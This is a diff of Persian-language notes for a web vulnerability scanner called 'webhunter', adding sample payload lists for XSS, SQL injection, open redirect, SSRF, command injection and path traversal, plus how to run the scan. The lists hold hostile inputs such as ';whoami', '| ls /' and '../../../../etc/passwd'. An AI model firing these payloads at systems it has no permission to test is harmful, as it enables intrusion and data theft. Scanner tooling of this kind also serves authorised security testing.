@@ -30,6 +30,9 @@ tech_stack.json: خروجی کامل قابل استفاده برای مرحله
 
 ========================================================================
 
+===>>> step2_recon.py
+
+
  ساختار پروژه بعد از مرحله دوم:
 ```
 webhunter/
@@ -50,3 +53,49 @@ webhunter/
 
 ```
 
+📝 نمونه محتویات فایل‌های پیلود:
+```
+payloads/xss.txt
+php-template
+```
+
+```
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+payloads/sql.txt
+```
+
+```
+' OR '1'='1
+" OR 1=1 --
+payloads/redirect.txt
+```
+
+```
+https://google.com
+//evil.com
+payloads/ssrf.txt
+```
+
+```
+http://127.0.0.1
+http://localhost/admin
+payloads/cmd.txt
+```
+
+```
+;whoami
+| ls /
+payloads/lfi.txt
+```
+
+```
+../../../../etc/passwd
+../boot.ini
+```
+✅ اجرای اسکریپت:
+```
+python3 step2_async_scanner.py
+```
+🧪 خروجی:
+فایل HTML out/vuln_scan_report.html تولید می‌شه که شامل جدول همه آسیب‌پذیری‌های پیدا‌شده با رنگ‌بندی نوع آسیب‌پذیری هست.
